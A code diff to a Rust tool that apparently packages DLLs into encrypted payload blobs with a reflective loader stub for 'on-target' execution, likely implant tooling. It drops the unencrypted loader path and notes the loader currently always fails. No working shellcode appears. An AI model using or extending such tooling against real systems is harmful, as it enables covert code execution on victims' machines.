@@ -110,6 +110,17 @@ fn main() {
         eprintln!("error: --encrypt requires --format v2");
         process::exit(2);
     }
+    // The loader path is ChaCha20-Poly1305-only: an unencrypted "stub + zero
+    // nonce + raw DLL" blob is not a supported loader payload (the on-target
+    // stub always decrypts, and the zero nonce would be reused as a key
+    // stream). Requiring --encrypt also keeps the emitted layout identical to
+    // what generate_loader_stub/wrap_payload produce.
+    if loader && !encrypt {
+        eprintln!("error: --loader requires --encrypt");
+        eprintln!("       (the loader path only emits ChaCha20-Poly1305-encrypted payloads;");
+        eprintln!("       raw-DLL loader blobs are not supported)");
+        process::exit(2);
+    }
 
     let pe = match fs::read(dll) {
         Ok(b) => b,
@@ -168,61 +179,41 @@ fn main() {
                 process::exit(1);
             }
         }
-    } else if loader && encrypt {
-        // ── v2 + loader + encrypt: full reflective loader via nyx_loader ──
-        let config = nyx_loader::LoaderConfig::random();
-        let payload = nyx_loader::wrap_payload(&pe, &config);
-        match fs::write(&out, &payload) {
-            Ok(_) => {
-                eprintln!(
-                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
-                    out.display(),
-                    payload.len(),
-                    nyx_loader::PIC_STUB_LEN,
-                    pe.len(),
-                );
-            }
-            Err(e) => {
-                eprintln!("error: write {}: {}", out.display(), e);
-                process::exit(1);
-            }
-        }
     } else if loader {
-        // ── v2 + loader (no encrypt): stub + NYX2 header + raw DLL ──────
-        use nyx_loader::stub::{NYX2_MAGIC, PIC_STUB};
-        // CRITICAL-27: dll_len goes into the NYX2 header as u32; reject files
-        // whose length does not fit so the header can never lie to the loader.
-        let dll_len = match usize_to_u32(pe.len()) {
-            Ok(v) => v,
-            Err(e) => {
-                eprintln!("error: {}", e);
-                process::exit(1);
-            }
-        };
-        let payload_cap = PIC_STUB
-            .len()
-            .saturating_add(4)
-            .saturating_add(4)
-            .saturating_add(12)
-            .saturating_add(pe.len());
-        let mut payload = Vec::with_capacity(payload_cap);
-        payload.extend_from_slice(PIC_STUB);
-        payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());
-        payload.extend_from_slice(&dll_len.to_le_bytes());
-        payload.extend_from_slice(&[0u8; 12]); // zero nonce (no encryption)
-        payload.extend_from_slice(&pe);
-        match fs::write(&out, &payload) {
-            Ok(_) => {
-                eprintln!(
-                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B raw DLL; format=v2 loader=yes encrypt=no)",
-                    out.display(),
-                    payload.len(),
-                    PIC_STUB.len(),
-                    pe.len(),
-                );
+        // ── v2 + loader + encrypt: full reflective loader via nyx_loader ──
+        // NOTE: this path currently ALWAYS fails. generate_loader_stub()
+        // returns LoaderError::Layer2Unavailable because the on-target
+        // Layer-2 shellcode does not exist; the loader capability is not
+        // shippable until a real Layer-2 lands. We route through it anyway so
+        // the failure is loud and carries the actionable error message,
+        // instead of silently emitting a broken blob.
+        let config = nyx_loader::LoaderConfig::random();
+        match nyx_loader::wrap_payload(&pe, &config) {
+            Ok(payload) => {
+                // Stub length = payload - (magic 4 + enc_len 4 + nonce 12 +
+                // ciphertext dll.len() + tag 16). Computed, never reported
+                // from the historical PIC_STUB_LEN constant.
+                let stub_len = payload.len().saturating_sub(4 + 4 + 12 + pe.len() + 16);
+                match fs::write(&out, &payload) {
+                    Ok(_) => {
+                        eprintln!(
+                            "wrote {} ({} bytes: {}B loader stub + NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
+                            out.display(),
+                            payload.len(),
+                            stub_len,
+                            pe.len(),
+                        );
+                    }
+                    Err(e) => {
+                        eprintln!("error: write {}: {}", out.display(), e);
+                        process::exit(1);
+                    }
+                }
             }
             Err(e) => {
-                eprintln!("error: write {}: {}", out.display(), e);
+                eprintln!("error: cannot emit reflective loader blob: {e}");
+                eprintln!("       the loader capability is not shippable until a real on-target");
+                eprintln!("       Layer-2 exists (see crates/nyx-loader); no blob was written.");
                 process::exit(1);
             }
         }
@@ -269,10 +260,11 @@ fn usage(prog: &str) -> ! {
     eprintln!("options:");
     eprintln!("  -o, --output <path>   Output file path (default: agent.bin)");
     eprintln!("  --format v1|v2        Payload format (default: v1)");
-    eprintln!("  --loader              Embed PIC reflective loader stub (requires --format v2)");
+    eprintln!("  --loader              Embed reflective loader stub (requires --format v2 + --encrypt)");
     eprintln!(
         "  --encrypt             ChaCha20-Poly1305 encrypt the DLL portion (requires --format v2)"
     );
+    eprintln!("  --loader requires --encrypt (the loader path only emits encrypted payloads)");
     eprintln!("  -h, --help            Show this help");
     eprintln!();
     eprintln!("examples:");
